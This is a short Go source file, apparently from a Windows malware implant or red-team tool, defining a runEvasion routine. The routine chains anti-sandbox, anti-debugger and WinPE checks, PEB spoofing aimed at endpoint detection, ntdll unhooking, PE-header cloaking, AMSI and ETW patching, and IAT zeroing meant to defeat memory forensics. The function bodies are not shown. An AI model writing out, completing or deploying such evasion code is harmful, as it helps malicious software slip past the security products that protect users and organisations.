//go:build windows
// +build windows

package evasion

func runEvasion() {
	exitIfWinPE()
	evadeSandbox()
	evadeDebugger()
	spoofPEB()         // change visible process name/cmdline before any EDR check
	unhookNtdll()      // clean NT stubs — must run before any NT-based patches
	cloakPEHeader()
	patchAMSI()
	patchETW()
	patchEtwRegister() // block future ETW provider registrations
	iatStomp()         // zero IAT so memory dumps reveal no imports
}
